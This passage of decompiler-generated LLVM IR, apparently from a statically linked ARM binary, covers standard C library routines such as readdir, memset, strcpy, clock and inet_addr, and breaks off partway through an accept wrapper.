  %v2_11a44.in = phi i16 [ %v3_11a00, %dec_label_pc_119f8 ], [ %v3_11a38, %dec_label_pc_11a30 ]
  %v1_11a44 = phi i32 [ %v0_119fc, %dec_label_pc_119f8 ], [ %v0_11a34, %dec_label_pc_11a30 ]
  %storemerge = phi i32 [ 20, %dec_label_pc_119f8 ], [ %v1_11a40, %dec_label_pc_11a30 ]
  %v2_11a44 = sext i16 %v2_11a44.in to i32
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  %v3_11a44 = add i32 %v1_11a44, %v2_11a44
  %v4_11a44 = inttoptr i32 %v3_11a44 to i32*
  store i32 %storemerge, i32* %v4_11a44, align 4
  %v0_11a64.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11a64

dec_label_pc_11a4c:                               ; preds = %dec_label_pc_11a24
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v0_11a50 = load i32, i32* @r4, align 4
  %v2_11a54 = call i32 @fd_to_DIR(i32 %v0_11a50, i32 %tmp)
  store i32 %v2_11a54, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11a64

dec_label_pc_11a60:                               ; preds = %entry, %dec_label_pc_11a10
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11a64

dec_label_pc_11a64:                               ; preds = %dec_label_pc_11a4c, %dec_label_pc_11a44, %dec_label_pc_11a60
  %v0_11a64 = phi i32 [ %v2_11a54, %dec_label_pc_11a4c ], [ %v0_11a64.pre, %dec_label_pc_11a44 ], [ 0, %dec_label_pc_11a60 ]
  ret i32 %v0_11a64

; uselistorder directives
  uselistorder i32 %v1_11a24, { 1, 0 }
  uselistorder i32 %v2_11a18, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 6, 4, 5, 7, 0 }
  uselistorder i32 (i32, i32)* @fd_to_DIR, { 1, 0 }
  uselistorder i32 21, { 6, 0, 7, 8, 5, 1, 2, 3, 4 }
  uselistorder i32 ()* @fstat, { 1, 0 }
  uselistorder label %dec_label_pc_11a64, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11a60, { 1, 0 }
  uselistorder label %dec_label_pc_11a44, { 1, 0 }
}

define i32 @__GI_readdir(i32* %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_11a7c = load i32, i32* @r4, align 4
  %v6_11a7c = load i32, i32* @r5, align 4
  %v9_11a7c = load i32, i32* @r6, align 4
  %v12_11a7c = load i32, i32* @r7, align 4
  %v15_11a7c = load i32, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_22204.365 to i32), i32* @r6, align 4
  %v1_11a90 = add i32 %tmp, 24
  store i32 %v1_11a90, i32* @r4, align 4
  %v4_11a94 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22204.365 to i32), i32 68) to i32*), align 4
  store i32 %v4_11a94, i32* %r1.global-to-local, align 4
  store i32 %v1_11a90, i32* %r2.global-to-local, align 4
  store i32 %tmp, i32* @r5, align 4
  %v4_11aa8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22204.365 to i32), i32 112) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_11aa8)
  %v0_11abc = load i32, i32* @r6, align 4
  %v2_11abc = add i32 %v0_11abc, 16
  %v3_11abc = inttoptr i32 %v2_11abc to i32*
  %v4_11abc = load i32, i32* %v3_11abc, align 4
  store i32 %v4_11abc, i32* @ip, align 4
  store i32 72392, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_11abc)
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_11acc

dec_label_pc_11acc:                               ; preds = %dec_label_pc_11afc, %entry
  %v0_11acc = load i32, i32* @r5, align 4
  %v1_11acc = add i32 %v0_11acc, 4
  %v2_11acc = inttoptr i32 %v1_11acc to i32*
  %v3_11acc = load i32, i32* %v2_11acc, align 4
  store i32 %v3_11acc, i32* %r2.global-to-local, align 4
  %v4_11acc = add i32 %v0_11acc, 8
  %v5_11acc = inttoptr i32 %v4_11acc to i32*
  %v6_11acc = load i32, i32* %v5_11acc, align 4
  %tmp10 = icmp ugt i32 %v6_11acc, %v3_11acc
  br i1 %tmp10, label %dec_label_pc_11afc, label %dec_label_pc_11ad8

dec_label_pc_11ad8:                               ; preds = %dec_label_pc_11acc
  %v1_11ad8 = inttoptr i32 %v0_11acc to i32*
  %v2_11ad8 = load i32, i32* %v1_11ad8, align 4
  %v1_11adc = add i32 %v0_11acc, 12
  %v2_11adc = inttoptr i32 %v1_11adc to i32*
  %v3_11adc = load i32, i32* %v2_11adc, align 4
  store i32 %v3_11adc, i32* %r1.global-to-local, align 4
  %v1_11ae0 = add i32 %v0_11acc, 20
  %v2_11ae0 = inttoptr i32 %v1_11ae0 to i32*
  %v3_11ae0 = load i32, i32* %v2_11ae0, align 4
  store i32 %v3_11ae0, i32* %r2.global-to-local, align 4
  %v4_11ae4 = call i32 @__getdents(i32 %v2_11ad8, i32 %v3_11adc, i32 %v3_11ae0, i32 %v6_11acc)
  %tmp9 = icmp slt i32 %v4_11ae4, 1
  br i1 %tmp9, label %.thread, label %dec_label_pc_11af4

.thread:                                          ; preds = %dec_label_pc_11ad8
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_11b28

dec_label_pc_11af4:                               ; preds = %dec_label_pc_11ad8
  %v1_11af4 = load i32, i32* @r5, align 4
  %v2_11af4 = add i32 %v1_11af4, 8
  %v3_11af4 = inttoptr i32 %v2_11af4 to i32*
  store i32 %v4_11ae4, i32* %v3_11af4, align 4
  %v0_11af8 = load i32, i32* @r7, align 4
  %v1_11af8 = load i32, i32* @r5, align 4
  %v2_11af8 = add i32 %v1_11af8, 4
  %v3_11af8 = inttoptr i32 %v2_11af8 to i32*
  store i32 %v0_11af8, i32* %v3_11af8, align 4
  %v0_11afc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_11afc

dec_label_pc_11afc:                               ; preds = %dec_label_pc_11acc, %dec_label_pc_11af4
  %v1_11b0c = phi i32 [ %v0_11acc, %dec_label_pc_11acc ], [ %v0_11afc.pre, %dec_label_pc_11af4 ]
  %v1_11afc = add i32 %v1_11b0c, 4
  %v2_11afc = inttoptr i32 %v1_11afc to i32*
  %v3_11afc = load i32, i32* %v2_11afc, align 4
  store i32 %v3_11afc, i32* %r2.global-to-local, align 4
  %v1_11b00 = add i32 %v1_11b0c, 12
  %v2_11b00 = inttoptr i32 %v1_11b00 to i32*
  %v3_11b00 = load i32, i32* %v2_11b00, align 4
  store i32 %v3_11b00, i32* %r1.global-to-local, align 4
  %v2_11b04 = add i32 %v3_11b00, %v3_11afc
  store i32 %v2_11b04, i32* @r4, align 4
  %v1_11b08 = add i32 %v2_11b04, 4
  %v2_11b08 = inttoptr i32 %v1_11b08 to i32*
  %v3_11b08 = load i32, i32* %v2_11b08, align 4
  %v2_11b0c = add i32 %v1_11b0c, 16
  %v3_11b0c = inttoptr i32 %v2_11b0c to i32*
  store i32 %v3_11b08, i32* %v3_11b0c, align 4
  %v0_11b10 = load i32, i32* @r4, align 4
  %v1_11b10 = add i32 %v0_11b10, 8
  %v2_11b10 = inttoptr i32 %v1_11b10 to i16*
  %v3_11b10 = load i16, i16* %v2_11b10, align 2
  %v4_11b10 = zext i16 %v3_11b10 to i32
  %v0_11b14 = load i32, i32* %r2.global-to-local, align 4
  %v1_11b14 = load i32, i32* %r1.global-to-local, align 4
  %v2_11b14 = add i32 %v1_11b14, %v0_11b14
  %v3_11b14 = inttoptr i32 %v2_11b14 to i32*
  %v4_11b14 = load i32, i32* %v3_11b14, align 4
  store i32 %v4_11b14, i32* %r1.global-to-local, align 4
  %v2_11b18 = add i32 %v0_11b14, %v4_11b10
  %v2_11b1c = icmp eq i32 %v4_11b14, 0
  %v1_11b20 = load i32, i32* @r5, align 4
  %v2_11b20 = add i32 %v1_11b20, 4
  %v3_11b20 = inttoptr i32 %v2_11b20 to i32*
  store i32 %v2_11b18, i32* %v3_11b20, align 4
  br i1 %v2_11b1c, label %dec_label_pc_11acc, label %dec_label_pc_11b28

dec_label_pc_11b28:                               ; preds = %dec_label_pc_11afc, %.thread
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_11b34 = load i32, i32* @r6, align 4
  %v2_11b34 = add i32 %v0_11b34, 44
  %v3_11b34 = inttoptr i32 %v2_11b34 to i32*
  %v4_11b34 = load i32, i32* %v3_11b34, align 4
  call void @__pseudo_branch(i32 %v4_11b34)
  %v0_11b40 = load i32, i32* @r4, align 4
  store i32 %v3_11a7c, i32* @r4, align 4
  store i32 %v6_11a7c, i32* @r5, align 4
  store i32 %v9_11a7c, i32* @r6, align 4
  store i32 %v12_11a7c, i32* @r7, align 4
  store i32 %v15_11a7c, i32* @lr, align 4
  ret i32 %v0_11b40

; uselistorder directives
  uselistorder i32 %v1_11b0c, { 0, 2, 1 }
  uselistorder i32 %v6_11acc, { 1, 0 }
  uselistorder i32 %v0_11acc, { 0, 1, 3, 2, 4, 5 }
  uselistorder label %dec_label_pc_11afc, { 1, 0 }
}

define i32 @function_11b54(i32 %arg1) local_unnamed_addr {
dec_label_pc_11b54:
  %v0_11b54 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11b54, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_11b54
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_11b54, %bb
  %v4_11b60 = phi i32 [ %arg1, %dec_label_pc_11b54 ], [ 0, %bb ]
  ret i32 %v4_11b60

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__GI___errno_location() local_unnamed_addr {
entry:
  %v0_11b64 = load i32, i32* @lr, align 4
  %v0_11b6c = call i32 @__aeabi_read_tp()
  %v3_11b70 = load i16, i16* @global_var_2225c.361, align 2
  %v4_11b70 = sext i16 %v3_11b70 to i32
  %v2_11b74 = add i32 %v4_11b70, %v0_11b6c
  store i32 %v0_11b64, i32* @lr, align 4
  ret i32 %v2_11b74
}

define i32 @clock(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-24 = alloca i32, align 4
  %v2_11b88 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_11b88, i32* @r0, align 4
  %v1_11b90 = call i32 @times(i32 %v2_11b88)
  %v2_11b94 = load i32, i32* %stack_var_-24, align 4
  %v2_11b98 = add i32 %v2_11b94, %tmp
  %v2_11ba0 = mul i32 %v2_11b98, 10000
  %v1_11ba4 = and i32 %v2_11ba0, 2147483632
  ret i32 %v1_11ba4

; uselistorder directives
  uselistorder i32 %v2_11b88, { 1, 0 }
}

define i32 @"$d.9"(i32 %arg1) local_unnamed_addr {
dec_label_pc_11bb4:
  %v0_11bb4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11bb4, label %bb, label %bb1

bb:                                               ; preds = %dec_label_pc_11bb4
  br label %bb1

bb1:                                              ; preds = %dec_label_pc_11bb4, %bb
  ret i32 %arg1

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i32 @memcpy() local_unnamed_addr {
entry:
  %v0_11bc0 = call i32 @_memcpy()
  ret i32 %v0_11bc0
}

define i32 @memmove(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_11bd0 = call i32 @_memcpy()
  ret i32 %v0_11bd0

; uselistorder directives
  uselistorder i32 ()* @_memcpy, { 1, 0 }
}

define i32 @__GI_memset(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r3, align 4
  %v8_11be4 = icmp eq i32 %arg3, 8
  store i1 %v8_11be4, i1* %cpsr_z.global-to-local, align 1
  %v5_11be8 = icmp slt i32 %arg3, 8
  br i1 %v5_11be8, label %dec_label_pc_11c48, label %dec_label_pc_11bec

dec_label_pc_11bec:                               ; preds = %entry
  %v4_11bec = mul i32 %arg2, 256
  %v5_11bec = or i32 %v4_11bec, %arg2
  %v4_11bf0 = mul i32 %v5_11bec, 65536
  %v5_11bf0 = or i32 %v4_11bf0, %v5_11bec
  store i32 %v5_11bf0, i32* @r1, align 4
  %v1_11bf457 = urem i32 %tmp, 4
  %v2_11bf458 = icmp eq i32 %v1_11bf457, 0
  store i1 %v2_11bf458, i1* %cpsr_z.global-to-local, align 1
  %extract.t83 = trunc i32 %arg2 to i8
  br i1 %v2_11bf458, label %dec_label_pc_11c04, label %bb

bb:                                               ; preds = %dec_label_pc_11bec, %.thread.bb_crit_edge
  %arg2.sink.off0 = phi i8 [ %extract.t82, %.thread.bb_crit_edge ], [ %extract.t83, %dec_label_pc_11bec ]
  %v3_11bf859 = phi i32 [ %v6_11bf8, %.thread.bb_crit_edge ], [ %tmp, %dec_label_pc_11bec ]
  %v4_11bf8 = inttoptr i32 %v3_11bf859 to i8*
  store i8 %arg2.sink.off0, i8* %v4_11bf8, align 1
  %v5_11bf8 = load i32, i32* @r3, align 4
  %v6_11bf8 = add i32 %v5_11bf8, 1
  store i32 %v6_11bf8, i32* @r3, align 4
  %v0_11bfc.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v0_11c08.pr.pre = load i32, i32* %r2.global-to-local, align 4
  br i1 %v0_11bfc.pr, label %dec_label_pc_11c04, label %.thread

.thread:                                          ; preds = %bb
  %v2_11bfc = add i32 %v0_11c08.pr.pre, -1
  store i32 %v2_11bfc, i32* %r2.global-to-local, align 4
  %v1_11bf4 = urem i32 %v6_11bf8, 4
  %v2_11bf4 = icmp eq i32 %v1_11bf4, 0
  store i1 %v2_11bf4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11bf4, label %dec_label_pc_11c04, label %.thread.bb_crit_edge

.thread.bb_crit_edge:                             ; preds = %.thread
  %v1_11bf8.pre = load i32, i32* @r1, align 4
  %extract.t82 = trunc i32 %v1_11bf8.pre to i8
  br label %bb

dec_label_pc_11c04:                               ; preds = %.thread, %bb, %dec_label_pc_11bec
  %v0_11c1028 = phi i32 [ %tmp, %dec_label_pc_11bec ], [ %v6_11bf8, %bb ], [ %v6_11bf8, %.thread ]
  %v0_11c08.pr = phi i32 [ %arg3, %dec_label_pc_11bec ], [ %v0_11c08.pr.pre, %bb ], [ %v2_11bfc, %.thread ]
  %v0_11c04 = load i32, i32* @r1, align 4
  store i32 %v0_11c04, i32* %ip.global-to-local, align 4
  %v8_11c0810 = icmp eq i32 %v0_11c08.pr, 8
  store i1 %v8_11c0810, i1* %cpsr_z.global-to-local, align 1
  %v5_11c0c11 = icmp slt i32 %v0_11c08.pr, 8
  br i1 %v5_11c0c11, label %dec_label_pc_11c48, label %dec_label_pc_11c10.preheader

dec_label_pc_11c10.preheader:                     ; preds = %dec_label_pc_11c04
  %v1_11c1046 = inttoptr i32 %v0_11c1028 to i32*
  store i32 %v0_11c04, i32* %v1_11c1046, align 4
  %v3_11c1047 = add i32 %v0_11c1028, 4
  %v4_11c1048 = inttoptr i32 %v3_11c1047 to i32*
  %v5_11c1049 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_11c1049, i32* %v4_11c1048, align 4
  %v6_11c1050 = add i32 %v0_11c1028, 8
  store i32 %v6_11c1050, i32* @r3, align 4
  %v0_11c1451 = load i32, i32* %r2.global-to-local, align 4
  %v1_11c1452 = add i32 %v0_11c1451, -8
  store i32 %v1_11c1452, i32* %r2.global-to-local, align 4
  %v5_11c1c53 = icmp slt i32 %v1_11c1452, 8
  br i1 %v5_11c1c53, label %dec_label_pc_11c10.dec_label_pc_11c48.loopexit_crit_edge, label %dec_label_pc_11c20

dec_label_pc_11c20:                               ; preds = %dec_label_pc_11c10.preheader, %dec_label_pc_11c08.dec_label_pc_11c10_crit_edge
  %v6_11c1055 = phi i32 [ %v6_11c10, %dec_label_pc_11c08.dec_label_pc_11c10_crit_edge ], [ %v6_11c1050, %dec_label_pc_11c10.preheader ]
  %v0_11c1054 = phi i32 [ %v12_11c3c, %dec_label_pc_11c08.dec_label_pc_11c10_crit_edge ], [ %v0_11c1028, %dec_label_pc_11c10.preheader ]
  %v1_11c20 = inttoptr i32 %v6_11c1055 to i32*
  %v2_11c20 = load i32, i32* @r1, align 4
  store i32 %v2_11c20, i32* %v1_11c20, align 4
  %v3_11c20 = add i32 %v0_11c1054, 12
  %v4_11c20 = inttoptr i32 %v3_11c20 to i32*
  %v5_11c20 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_11c20, i32* %v4_11c20, align 4
  %v6_11c20 = add i32 %v0_11c1054, 16
  store i32 %v6_11c20, i32* @r3, align 4
  %v0_11c24 = load i32, i32* %r2.global-to-local, align 4
  %v1_11c24 = add i32 %v0_11c24, -8
  store i32 %v1_11c24, i32* %r2.global-to-local, align 4
  %v5_11c2c = icmp slt i32 %v1_11c24, 8
  br i1 %v5_11c2c, label %dec_label_pc_11c20.dec_label_pc_11c48.loopexit_crit_edge, label %dec_label_pc_11c30

dec_label_pc_11c30:                               ; preds = %dec_label_pc_11c20
  %v1_11c30 = inttoptr i32 %v6_11c20 to i32*
  %v2_11c30 = load i32, i32* @r1, align 4
  store i32 %v2_11c30, i32* %v1_11c30, align 4
  %v3_11c30 = add i32 %v0_11c1054, 20
  %v4_11c30 = inttoptr i32 %v3_11c30 to i32*
  %v5_11c30 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_11c30, i32* %v4_11c30, align 4
  %v6_11c30 = add i32 %v0_11c1054, 24
  store i32 %v6_11c30, i32* @r3, align 4
  %v0_11c34 = load i32, i32* %r2.global-to-local, align 4
  %v1_11c34 = add i32 %v0_11c34, -8
  store i32 %v1_11c34, i32* %r2.global-to-local, align 4
  %v5_11c3c = icmp slt i32 %v1_11c34, 8
  br i1 %v5_11c3c, label %dec_label_pc_11c30.dec_label_pc_11c48.loopexit_crit_edge, label %dec_label_pc_11c08

dec_label_pc_11c08:                               ; preds = %dec_label_pc_11c30
  %v7_11c3c = inttoptr i32 %v6_11c30 to i32*
  %v8_11c3c = load i32, i32* @r1, align 4
  store i32 %v8_11c3c, i32* %v7_11c3c, align 4
  %v9_11c3c = add i32 %v0_11c1054, 28
  %v10_11c3c = inttoptr i32 %v9_11c3c to i32*
  %v11_11c3c = load i32, i32* %ip.global-to-local, align 4
  store i32 %v11_11c3c, i32* %v10_11c3c, align 4
  %v12_11c3c = add i32 %v0_11c1054, 32
  store i32 %v12_11c3c, i32* @r3, align 4
  %v6_11c40 = load i32, i32* %r2.global-to-local, align 4
  %v7_11c40 = add i32 %v6_11c40, -8
  store i32 %v7_11c40, i32* %r2.global-to-local, align 4
  %v5_11c0c = icmp slt i32 %v7_11c40, 8
  br i1 %v5_11c0c, label %dec_label_pc_11c08.dec_label_pc_11c48.loopexit_crit_edge, label %dec_label_pc_11c08.dec_label_pc_11c10_crit_edge

dec_label_pc_11c08.dec_label_pc_11c10_crit_edge:  ; preds = %dec_label_pc_11c08
  %v2_11c10.pre = load i32, i32* @r1, align 4
  %v1_11c10 = inttoptr i32 %v12_11c3c to i32*
  store i32 %v2_11c10.pre, i32* %v1_11c10, align 4
  %v3_11c10 = add i32 %v0_11c1054, 36
  %v4_11c10 = inttoptr i32 %v3_11c10 to i32*
  %v5_11c10 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_11c10, i32* %v4_11c10, align 4
  %v6_11c10 = add i32 %v0_11c1054, 40
  store i32 %v6_11c10, i32* @r3, align 4
  %v0_11c14 = load i32, i32* %r2.global-to-local, align 4
  %v1_11c14 = add i32 %v0_11c14, -8
  store i32 %v1_11c14, i32* %r2.global-to-local, align 4
  %v5_11c1c = icmp slt i32 %v1_11c14, 8
  br i1 %v5_11c1c, label %dec_label_pc_11c10.dec_label_pc_11c48.loopexit_crit_edge, label %dec_label_pc_11c20

dec_label_pc_11c08.dec_label_pc_11c48.loopexit_crit_edge: ; preds = %dec_label_pc_11c08
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11c48

dec_label_pc_11c10.dec_label_pc_11c48.loopexit_crit_edge: ; preds = %dec_label_pc_11c08.dec_label_pc_11c10_crit_edge, %dec_label_pc_11c10.preheader
  %v1_11c14.lcssa = phi i32 [ %v1_11c1452, %dec_label_pc_11c10.preheader ], [ %v1_11c14, %dec_label_pc_11c08.dec_label_pc_11c10_crit_edge ]
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11c48

dec_label_pc_11c20.dec_label_pc_11c48.loopexit_crit_edge: ; preds = %dec_label_pc_11c20
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11c48

dec_label_pc_11c30.dec_label_pc_11c48.loopexit_crit_edge: ; preds = %dec_label_pc_11c30
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11c48

dec_label_pc_11c48:                               ; preds = %dec_label_pc_11c04, %dec_label_pc_11c08.dec_label_pc_11c48.loopexit_crit_edge, %dec_label_pc_11c10.dec_label_pc_11c48.loopexit_crit_edge, %dec_label_pc_11c20.dec_label_pc_11c48.loopexit_crit_edge, %dec_label_pc_11c30.dec_label_pc_11c48.loopexit_crit_edge, %entry
  %v0_11c50 = phi i32 [ %arg3, %entry ], [ %v1_11c34, %dec_label_pc_11c30.dec_label_pc_11c48.loopexit_crit_edge ], [ %v1_11c24, %dec_label_pc_11c20.dec_label_pc_11c48.loopexit_crit_edge ], [ %v1_11c14.lcssa, %dec_label_pc_11c10.dec_label_pc_11c48.loopexit_crit_edge ], [ %v7_11c40, %dec_label_pc_11c08.dec_label_pc_11c48.loopexit_crit_edge ], [ %v0_11c08.pr, %dec_label_pc_11c04 ]
  %v2_11c48 = icmp eq i32 %v0_11c50, 0
  store i1 %v2_11c48, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11c48, label %bb32, label %bb33

bb32:                                             ; preds = %dec_label_pc_11c48
  ret i32 %tmp

bb33:                                             ; preds = %dec_label_pc_11c48
  %v1_11c50 = sub i32 7, %v0_11c50
  store i32 %v1_11c50, i32* %r2.global-to-local, align 4
  %v3_11c54 = mul i32 %v1_11c50, 4
  %v4_11c54 = add i32 %v3_11c54, ptrtoint (i32* @global_var_11c5c.405 to i32)
  call void @__pseudo_branch(i32 %v4_11c54)
  %v0_11c5c = load i32, i32* @r1, align 4
  %v1_11c5c = trunc i32 %v0_11c5c to i8
  %v2_11c5c = load i32, i32* @r3, align 4
  %v3_11c5c = inttoptr i32 %v2_11c5c to i8*
  store i8 %v1_11c5c, i8* %v3_11c5c, align 1
  %v4_11c5c = load i32, i32* @r3, align 4
  %v5_11c5c = add i32 %v4_11c5c, 1
  store i32 %v5_11c5c, i32* %r3.global-to-local, align 4
  %v0_11c60 = load i32, i32* @r1, align 4
  %v1_11c60 = trunc i32 %v0_11c60 to i8
  %v3_11c60 = inttoptr i32 %v5_11c5c to i8*
  store i8 %v1_11c60, i8* %v3_11c60, align 1
  %v4_11c60 = load i32, i32* %r3.global-to-local, align 4
  %v5_11c60 = add i32 %v4_11c60, 1
  store i32 %v5_11c60, i32* %r3.global-to-local, align 4
  %v0_11c64 = load i32, i32* @r1, align 4
  %v1_11c64 = trunc i32 %v0_11c64 to i8
  %v3_11c64 = inttoptr i32 %v5_11c60 to i8*
  store i8 %v1_11c64, i8* %v3_11c64, align 1
  %v4_11c64 = load i32, i32* %r3.global-to-local, align 4
  %v5_11c64 = add i32 %v4_11c64, 1
  store i32 %v5_11c64, i32* %r3.global-to-local, align 4
  %v0_11c68 = load i32, i32* @r1, align 4
  %v1_11c68 = trunc i32 %v0_11c68 to i8
  %v3_11c68 = inttoptr i32 %v5_11c64 to i8*
  store i8 %v1_11c68, i8* %v3_11c68, align 1
  %v4_11c68 = load i32, i32* %r3.global-to-local, align 4
  %v5_11c68 = add i32 %v4_11c68, 1
  store i32 %v5_11c68, i32* %r3.global-to-local, align 4
  %v0_11c6c = load i32, i32* @r1, align 4
  %v1_11c6c = trunc i32 %v0_11c6c to i8
  %v3_11c6c = inttoptr i32 %v5_11c68 to i8*
  store i8 %v1_11c6c, i8* %v3_11c6c, align 1
  %v4_11c6c = load i32, i32* %r3.global-to-local, align 4
  %v5_11c6c = add i32 %v4_11c6c, 1
  store i32 %v5_11c6c, i32* %r3.global-to-local, align 4
  %v0_11c70 = load i32, i32* @r1, align 4
  %v1_11c70 = trunc i32 %v0_11c70 to i8
  %v3_11c70 = inttoptr i32 %v5_11c6c to i8*
  store i8 %v1_11c70, i8* %v3_11c70, align 1
  %v4_11c70 = load i32, i32* %r3.global-to-local, align 4
  %v5_11c70 = add i32 %v4_11c70, 1
  store i32 %v5_11c70, i32* %r3.global-to-local, align 4
  %v0_11c74 = load i32, i32* @r1, align 4
  %v1_11c74 = trunc i32 %v0_11c74 to i8
  %v3_11c74 = inttoptr i32 %v5_11c70 to i8*
  store i8 %v1_11c74, i8* %v3_11c74, align 1
  %v4_11c74 = load i32, i32* %r3.global-to-local, align 4
  %v5_11c74 = add i32 %v4_11c74, 1
  store i32 %v5_11c74, i32* @r3, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v6_11c10, { 1, 0 }
  uselistorder i32 %v12_11c3c, { 1, 2, 0 }
  uselistorder i32 %v0_11c1054, { 0, 1, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_11c08.pr, { 0, 2, 1 }
  uselistorder i32 %v6_11bf8, { 2, 3, 0, 4, 1 }
  uselistorder i32 %v5_11bec, { 1, 0 }
  uselistorder i32 %tmp, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32* %r2.global-to-local, { 2, 10, 3, 4, 5, 6, 7, 8, 9, 1, 12, 13, 11, 0 }
  uselistorder i32* %ip.global-to-local, { 4, 1, 2, 3, 0, 5 }
  uselistorder i1* %cpsr_z.global-to-local, { 6, 4, 3, 2, 5, 1, 9, 8, 0, 7 }
  uselistorder i32 %arg3, { 1, 0, 3, 2, 4 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_11c48, { 4, 3, 2, 1, 0, 5 }
  uselistorder label %dec_label_pc_11c20, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @strcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  %v0_11c901 = load i32, i32* @r1, align 4
  %v1_11c902 = inttoptr i32 %v0_11c901 to i8*
  %v2_11c903 = load i8, i8* %v1_11c902, align 1
  %v2_11c945 = icmp eq i8 %v2_11c903, 0
  store i1 %v2_11c945, i1* %cpsr_z.global-to-local, align 1
  store i8 %v2_11c903, i8* %arg1, align 1
  br i1 %v2_11c945, label %dec_label_pc_11ca0, label %dec_label_pc_11c88

dec_label_pc_11c88:                               ; preds = %entry, %dec_label_pc_11c88
  %v0_11c88 = load i32, i32* @r1, align 4
  %v1_11c88 = add i32 %v0_11c88, 1
  store i32 %v1_11c88, i32* @r1, align 4
  %v0_11c8c = load i32, i32* %r2.global-to-local, align 4
  %v1_11c8c = add i32 %v0_11c8c, 1
  store i32 %v1_11c8c, i32* %r2.global-to-local, align 4
  %v1_11c90 = inttoptr i32 %v1_11c88 to i8*
  %v2_11c90 = load i8, i8* %v1_11c90, align 1
  %v2_11c94 = icmp eq i8 %v2_11c90, 0
  store i1 %v2_11c94, i1* %cpsr_z.global-to-local, align 1
  %v3_11c98 = inttoptr i32 %v1_11c8c to i8*
  store i8 %v2_11c90, i8* %v3_11c98, align 1
  %v0_11c9c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11c9c, label %dec_label_pc_11ca0, label %dec_label_pc_11c88

dec_label_pc_11ca0:                               ; preds = %dec_label_pc_11c88, %entry
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 0 }
  uselistorder label %dec_label_pc_11c88, { 1, 0 }
}

define i32 @inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v2_11cac = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v2_11cac, i32* @r1, align 4
  %v0_11cb0 = call i32 @inet_aton()
  %v2_11cb4 = icmp eq i32 %v0_11cb0, 0
  %v4_11cb8 = load i32, i32* %stack_var_-12, align 4
  %storemerge = select i1 %v2_11cb4, i32 -1, i32 %v4_11cb8
  ret i32 %storemerge
}

define i32 @__sys_accept() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11ccc = load i32, i32* @r7, align 4
  store i32 %v3_11ccc, i32* %stack_var_-8, align 4
  %v0_11cd8 = load i32, i32* @r0, align 4
  store i32 %v0_11cd8, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11cd8, -4095
  br i1 %tmp, label %dec_label_pc_11d00, label %dec_label_pc_11ce8

dec_label_pc_11ce8:                               ; preds = %entry
  %v0_11cec = call i32 @__aeabi_read_tp()
  %v3_11cf0 = load i16, i16* @global_var_2225c.361, align 2
  %v4_11cf0 = sext i16 %v3_11cf0 to i32
